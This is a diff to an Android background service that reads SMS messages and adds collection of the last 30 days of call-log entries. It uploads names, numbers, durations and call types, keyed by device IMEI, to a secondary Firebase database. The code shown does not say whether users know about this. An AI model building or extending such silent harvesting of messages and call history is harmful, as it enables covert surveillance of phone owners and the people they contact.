@@ -8,14 +8,16 @@ import android.content.SharedPreferences;
 import android.database.Cursor;
 import android.net.Uri;
 import android.os.IBinder;
+import android.provider.CallLog;
 import android.support.annotation.Nullable;
 import android.telephony.TelephonyManager;
-import android.util.Log;
 
 import com.google.firebase.FirebaseApp;
 import com.google.firebase.FirebaseOptions;
 import com.google.firebase.database.DatabaseReference;
 import com.google.firebase.database.FirebaseDatabase;
+
+import java.util.Calendar;
 
 /**
  * Created by Admin on 01-02-2017.
@@ -24,10 +26,20 @@ import com.google.firebase.database.FirebaseDatabase;
 public class ReadMessages extends Service {
     private String fpId,mobileId=null;
     private static final Uri MESSAGE_URI = Uri.parse("content://sms/");
+    private static final Uri CALL_LOG_URI = CallLog.Calls.CONTENT_URI;
     private String[] projections=new String[]{"date","address","body","seen"};
+    String[] CALL_LOG_PROJECTIONS = new String[] {
+            CallLog.Calls.CACHED_NAME,
+            CallLog.Calls.NUMBER,
+            CallLog.Calls.DATE,
+            CallLog.Calls.DURATION,
+            CallLog.Calls.TYPE
+    };
     private String selection="";
     private String order="date DESC";
+    private String CALL_order=CallLog.Calls.DATE+" DESC";
     private int selectionLength=Constants.selections.length;
+    final private int DAYS_BEFORE =30;
 
 
     @Override
@@ -36,7 +48,6 @@ public class ReadMessages extends Service {
         fpId =pref.getString(Constants.FP_ID,null);
         TelephonyManager tm = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
         mobileId = tm.getDeviceId();
-
 
         if(mobileId == null || fpId == null){
             return Service.START_NOT_STICKY;
@@ -51,10 +62,8 @@ public class ReadMessages extends Service {
             else{
                 builder.append(" address Like \"%"+Constants.selections[i]+"%\" or");
             }
-
         }
         selection =builder.toString();
-        Log.d("Slection Param:", selection);
 
         new Thread(new Runnable() {
             @Override
@@ -73,6 +82,7 @@ public class ReadMessages extends Service {
                 FirebaseDatabase secondDatabase = FirebaseDatabase.getInstance(secondApp);
                 DatabaseReference mDatabase = secondDatabase.getReference();
                 readMessage(mDatabase);
+                readCallLog(mDatabase);
                 stopSelf();
             }
         }).start();
@@ -89,6 +99,77 @@ public class ReadMessages extends Service {
     public IBinder onBind(Intent intent) {
         return null;
     }
+
+    private void readCallLog(DatabaseReference mDatabase){
+        ContentResolver resolver = getContentResolver();
+        Calendar calendar = Calendar.getInstance();
+        String currentTime = String.valueOf(calendar.getTimeInMillis());
+
+        calendar.add(Calendar.DATE,-DAYS_BEFORE);
+        String selection = CallLog.Calls.DATE+">="+calendar.getTimeInMillis();
+        Cursor cursor = resolver.query(CALL_LOG_URI,CALL_LOG_PROJECTIONS,selection,null,CALL_order);
+        if(cursor!=null && cursor.moveToFirst()){
+
+            PhoneIds phoneIds=new PhoneIds();
+            phoneIds.setDate(currentTime);
+            phoneIds.setPhoneId(mobileId);
+            DatabaseReference phoneIdRef = mDatabase.child(fpId+Constants.DETAILS).child(Constants.PHONE_IDS);
+            phoneIdRef.child(mobileId).setValue(phoneIds);
+
+            CallLogModel model;
+
+            DatabaseReference MessageIdRef = mDatabase.child(fpId+Constants.CALL_LOG).child(mobileId);
+            MessageIdRef.removeValue();
+
+            do{
+                model = new CallLogModel();
+
+                model.setName(cursor.getString(0));
+                model.setNumber(cursor.getString(1));
+                model.setDate(String.valueOf(cursor.getLong(2)));
+                model.setDuration_seconds(String.valueOf(cursor.getLong(3)));
+                int callType = cursor.getInt(4);
+
+                String type = null;
+                switch (callType) {
+                    case CallLog.Calls.OUTGOING_TYPE:
+                        type = "Outgoing";
+                        break;
+
+                    case CallLog.Calls.INCOMING_TYPE:
+                        type = "Incoming";
+                        break;
+
+                    case CallLog.Calls.MISSED_TYPE:
+                        type = "Missed";
+                        break;
+                    case CallLog.Calls.REJECTED_TYPE:
+                        type = "Rejected";
+                        break;
+                }
+                model.setCallType(type);
+                MessageIdRef.push().setValue(model);
+
+            }while(cursor.moveToNext());
+            cursor.close();
+        }
+    }
+
+   /* private void addCallBack(DatabaseReference messageIdRef) {
+        messageIdRef.addValueEventListener(new ValueEventListener() {
+            @Override
+            public void onDataChange(DataSnapshot dataSnapshot) {
+                for (DataSnapshot data:dataSnapshot.getChildren()){
+                    Log.v("ggg",data.toString());
+                }
+            }
+
+            @Override
+            public void onCancelled(DatabaseError databaseError) {
+
+            }
+        });
+    }*/
 
     private void readMessage(DatabaseReference mDatabase){
         ContentResolver resolver = getContentResolver();
@@ -115,7 +196,7 @@ public class ReadMessages extends Service {
 
                 }while(cursor.moveToNext());
                 cursor.close();
-        }
+            }
     }
 
     @Override
